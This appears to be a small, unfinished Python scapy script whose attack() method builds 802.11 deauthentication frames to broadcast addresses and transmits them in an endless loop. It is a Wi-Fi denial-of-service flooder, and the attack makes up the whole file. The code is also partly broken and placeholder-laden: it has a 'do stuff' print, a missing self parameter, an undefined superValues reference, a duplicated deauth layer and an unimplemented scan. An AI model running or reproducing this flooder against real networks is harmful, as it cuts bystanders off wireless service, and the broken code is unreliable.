from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, sendp


class deauth:

    def attack():
        print("do stuff")

            
        # Scan for APs

        client = "FF:FF:FF:FF:FF:FF"
        ap = "FF:FF:FF:FF:FF:FF"

        # deauth packet for AP

        dot11 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)

        while (True):
            sendp(packet, iface=superValues.interfaceName, verbose=False)

        #sendp(packet, inter=0.1, count=100, iface=superValues.interfaceName, verbose=1)


